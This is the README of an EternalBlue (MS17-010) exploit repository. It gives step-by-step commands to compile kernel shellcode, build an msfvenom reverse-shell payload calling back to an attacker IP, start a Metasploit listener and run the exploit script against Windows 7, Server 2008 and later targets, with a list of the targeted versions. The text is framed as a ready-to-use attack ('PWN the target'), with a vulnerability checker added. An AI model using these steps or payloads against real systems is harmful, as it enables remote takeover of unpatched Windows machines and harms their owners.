# MS17-010 (ETERNAL BLUE) Exploit Code

This is some no-bs public exploit code that generates valid shellcode for the eternal blue exploit and scripts out the event listener with the metasploit multi-handler.

This version of the exploit is prepared in a way where you can exploit eternal blue WITHOUT metasploit. Your options for auto shell generation are to generate shellcode with msfvenom that has meterpreter (i.e. with metasploit) or to generate a normal windows cmd shell (i.e. without metasploit). You may also select between staged and stageless payloads if you wish to avoid utilizing the msfconsole entirely and use netcat/your own shell handler. Alternatively you can elect to brew in your own shellcode.

This allows for this version of the MS17-010 exploit to be a bit more flexible, and also fully functional, as many exploits leave out the steps to compile the kernel shellcode that usually comes with it.

Included is also an enternal blue checker script that allows you to test if your target is potentially vulnerable to MS17-010

run `python eternalblue_checker.py <TARGET-IP>`


## TODO:
1. Testing with non-msfvenom shellcode

## VIDEO TUTORIALS:
- https://www.youtube.com/watch?v=p9OnxS1oDc0
- https://youtu.be/2FwqryKUoX8


## USAGE:
Navigate to the `shellcode` directory in the repo:

run `./shell_prep.sh`

Follow the prompts, for example:
```
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
<YOUR-IP>
LPORT you want x64 to listen on:
<SOME PORT>
LPORT you want x86 to listen on:
<SOME OTHER PORT>
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
0
```

After the script finishes there will be a shellcode binary named `sc_all.bin` in the shellcode directory


Next, navigate to the main repo directory:

run `listener_prep.sh`

Follow the prompts, for example:
```
 /,-
  ||)
  \\_, )
   `--'
Enternal Blue Metasploit Listener

LHOST for reverse connection:
<YOUR-IP>
LPORT for x64 reverse connection:
<SOME PORT>
LPORT for x86 reverse connection:
<SOME OTHER PORT>
Enter 0 for meterpreter shell or 1 for regular cmd shell:
0
Starting listener...
```

## PWN:
If you have completed the USAGE steps, now you're ready to PWN the target.

run:

`python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin> <Number of Groom Connections (optional)>`

This has only been tested on Windows 7/Server 2008, and Windows 10 10240 (x64) 

However the exploit included in this repo also includes the Windows 8/Server 2012 version and *should* work.


The original exploit code that this repo pulls from is located here: https://github.com/worawit/MS17-010

## Targets:

eternalblue_exploit7.py:
```
Windows Server 2008 & R2
Windows Server 2012 & R2 (x86)
Windows Server 2016 (x64)
Windows Vista
Windows 7
```

eternalblue_exploit8.py:
```
Windows 2012 R2 x64
Windows 8.1 x64
Windows 10 Pro Build 10240 x64
```

eternalblue_exploit10.py:
```
Windows 2012 R2 x64
Windows 8.1 x64
Windows 10 Pro Build 10240 x64
```

## Generate Shellcode (Manually):

Assemble kernel shellcode with nasm:
```
nasm -f bin shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
```
Generate a binary payload with venom:
```
msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.1.123 --platform windows -a x86 -f raw -o sc_x86_payload.bin
Saved as: sc_x86_payload.bin
```
Concentrate it:
```
cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
```



## Merging binaries (x86 and x86_64):
```
python shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
```

## Setting up listener (Manually):
```
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST x.x.x.x
set LPORT xxx
exploit -j
```

## [[: not found (Error)

If your got this issue:
```
./listener_prep.sh: 18: [[: not found
./listener_prep.sh: 59: [[: not found
```

Change you shell to bash shell:

```
bash
```

